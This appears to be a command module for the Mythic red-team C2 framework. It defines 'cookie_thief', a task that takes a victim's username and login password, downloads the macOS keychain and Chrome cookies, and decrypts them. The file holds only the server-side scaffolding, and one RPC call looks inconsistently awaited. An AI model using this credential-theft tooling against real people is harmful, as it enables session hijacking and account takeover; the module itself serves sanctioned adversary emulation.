from mythic_payloadtype_container.MythicCommandBase import *
import json
from mythic_payloadtype_container.MythicRPC import *


class CookieThiefArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "password": CommandParameter(
                name="User Login Password",
                type=ParameterType.String,
                description="p@55w0rd_here for user login",
                required=True,
                ui_position=1
            ),
            "browser": CommandParameter(
                name="Browser",
                type=ParameterType.ChooseOne,
                choices=["chrome"],
                required=False,
                description="choose the browser to steal cookies from",
                default_value="chrome",
                ui_position=2
            ),
            "username": CommandParameter(
                name="Username",
                type=ParameterType.String,
                description="Victim's username from whom to steal the cookies",
                required=True,
                ui_position=3
            ),
        }

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)


class CookieThiefCommand(CommandBase):
    cmd = "cookie_thief"
    needs_admin = True
    help_cmd = "cookie_thief {user account password} {browser} {username}"
    description = "Downloads the keychain db and browser cookies, decrypts the keychain, extracts the cookie key and decrypts the cookies."
    version = 1
    #supported_ui_features = ["file_browser:download"] #CHANGE
    author = "@antman"
    parameters = []
    attackmapping = ["T1539", "T1555"]
    argument_class = CookieThiefArguments
    browser_script = BrowserScript(script_name="cookie_thief", author="@antman1p")

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        task.completed_callback_function = self.downloads_complete
        return task

    async def process_response(self, response: AgentResponse):
        pass

    async def downloads_complete(self, task: MythicTask, subtask: dict = None, subtask_group_name: str = None) -> MythicTask:
        dlResponses = MythicRPC().execute("get_responses", task_id=task.id)
        print(dlResponses["files"][0]["filename"])
        print(dlResponses["files"][1]["filename"])
        sys.stdout.flush()

        resp = await MythicRPC().execute("create_output", task_id=task.id,
                                          output="Files Downloaded"
                                          )
        return task
